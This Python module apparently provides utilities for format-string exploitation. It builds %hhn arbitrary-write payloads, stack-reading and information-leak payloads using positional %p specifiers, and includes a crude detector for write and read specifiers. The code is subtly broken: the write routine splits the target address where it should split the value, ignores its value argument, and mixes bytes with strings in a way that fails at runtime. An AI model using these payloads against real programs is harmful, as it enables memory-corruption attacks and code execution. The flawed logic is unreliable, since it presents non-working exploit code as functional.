"""
Format String Exploit Module

Provides utilities for format string exploitation.
"""

from typing import List, Optional, Dict
import struct


class FormatStringExploit:
    """
    Utilities for format string exploitation.
    
    Helps construct format string payloads for various attacks.
    """
    
    def __init__(self):
        """Initialize format string exploit utilities."""
        pass
    
    def create_write_payload(self, 
                            address: int,
                            value: int,
                            offset: int = 1) -> str:
        """
        Create format string payload to write value to address.
        
        Args:
            address: Target address to write to
            value: Value to write
            offset: Stack offset to format string
            
        Returns:
            Format string payload
        """
        # Split address into bytes
        addr_bytes = address.to_bytes(4, byteorder='little')
        
        # Calculate write values
        writes = []
        for i, byte_val in enumerate(addr_bytes):
            if byte_val > 0:
                writes.append((i, byte_val))
        
        # Build format string
        payload_parts = []
        
        # Addresses
        for i, _ in writes:
            payload_parts.append(struct.pack('<I', address + i))
        
        # Format specifiers
        current_offset = offset
        for i, (byte_idx, byte_val) in enumerate(writes):
            # Calculate padding
            if i == 0:
                padding = byte_val - (len(''.join(payload_parts)) % 256)
            else:
                padding = (byte_val - writes[i-1][1]) % 256
            
            if padding < 0:
                padding += 256
            
            # Add format specifier
            payload_parts.append(f'%{padding}x')
            payload_parts.append(f'%{current_offset}$hhn')
            current_offset += 1
        
        return ''.join(payload_parts)
    
    def create_read_payload(self, offset: int, count: int = 10) -> str:
        """
        Create format string payload to read from stack.
        
        Args:
            offset: Starting stack offset
            count: Number of values to read
            
        Returns:
            Format string payload
        """
        payload_parts = []
        for i in range(count):
            payload_parts.append(f'%{offset + i}$p')
            if i < count - 1:
                payload_parts.append(' ')
        
        return ''.join(payload_parts)
    
    def create_info_leak_payload(self, offset: int) -> str:
        """
        Create payload to leak information from stack.
        
        Args:
            offset: Stack offset
            
        Returns:
            Format string payload
        """
        return f'%{offset}$p %{offset + 1}$p %{offset + 2}$p'
    
    def analyze_format_string(self, format_str: str) -> Dict[str, any]:
        """
        Analyze a format string for vulnerabilities.
        
        Args:
            format_str: Format string to analyze
            
        Returns:
            Analysis results
        """
        analysis = {
            'has_write': False,
            'has_read': False,
            'write_addresses': [],
            'read_offsets': [],
        }
        
        # Check for write operations (%n, %hn, %hhn)
        if '%n' in format_str or '%hn' in format_str or '%hhn' in format_str:
            analysis['has_write'] = True
        
        # Check for read operations (%p, %x, %s)
        if '%p' in format_str or '%x' in format_str or '%s' in format_str:
            analysis['has_read'] = True
        
        return analysis

